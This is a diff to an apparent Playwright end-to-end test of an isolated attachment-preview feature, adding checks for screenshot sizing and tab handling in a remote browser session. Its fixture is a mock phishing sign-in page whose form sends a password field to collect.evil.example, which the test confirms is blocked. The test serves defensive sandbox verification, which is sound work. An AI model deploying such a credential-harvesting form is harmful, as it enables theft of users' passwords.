@@ -383,7 +383,10 @@ test('attachments are previewed by the isolated workers', async () => {
     '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
     '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
   const html =
-    '<html><head><title>Sign in</title></head><body><form action="https://collect.evil.example/p">' +
+    '<html><head><title>Sign in</title></head><body>' +
+    // Opens a second window, as a sign-in page does for its help or its identity provider.
+    '<a target="_blank" href="?help=1" style="position:fixed;left:0;top:0;width:220px;height:44px">Help</a>' +
+    '<form action="https://collect.evil.example/p">' +
     '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
   const eml = [
     'From: Billing <billing@invoices.example>',
@@ -440,9 +443,31 @@ test('attachments are previewed by the isolated workers', async () => {
     await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
     await expect(remote).toContainText('no network')
     await expect(remote).toContainText(/request(s)? refused/)
+    // The page is drawn at the size of the space it has: one picture pixel per screen pixel.
+    const picture = remote.getByRole('img', { name: /^Screenshot of/ })
+    await expect
+      .poll(() => picture.evaluate((img) => img.naturalWidth > 1000 && img.naturalWidth === img.clientWidth), {
+        timeout: 20_000,
+      })
+      .toBe(true)
+    await expect(remote.getByRole('button', { name: 'Full screen' })).toBeVisible()
+    // A window the page opens is a tab of the session; closing it shows the first one again.
+    const tabs = remote.getByRole('tablist', { name: 'Tabs of the session' })
+    await expect(tabs).toHaveCount(0)
+    await remote.getByRole('application', { name: /Remote page/ }).click({ position: { x: 30, y: 15 } })
+    await expect(tabs.getByRole('tab')).toHaveCount(2, { timeout: 20_000 })
+    await expect(tabs.getByRole('tab').nth(1)).toHaveAttribute('aria-selected', 'true')
+    await tabs.getByRole('tab').first().click()
+    await expect(tabs.getByRole('tab').first()).toHaveAttribute('aria-selected', 'true')
+    await tabs
+      .getByRole('button', { name: /^Close the tab/ })
+      .nth(1)
+      .click()
+    await expect(tabs).toHaveCount(0)
     // The Network panel lists the refused requests (the page's image, its form target).
     await remote.getByRole('button', { name: /^Network/ }).click()
-    await expect(remote.locator('tbody tr', { hasText: 'logo.png' })).toContainText('blocked')
+    // One per tab that loaded the page.
+    await expect(remote.locator('tbody tr', { hasText: 'logo.png' }).first()).toContainText('blocked')
     await remote.getByRole('button', { name: 'Close' }).click()
     // The session becomes a capture of the incident.
     await page
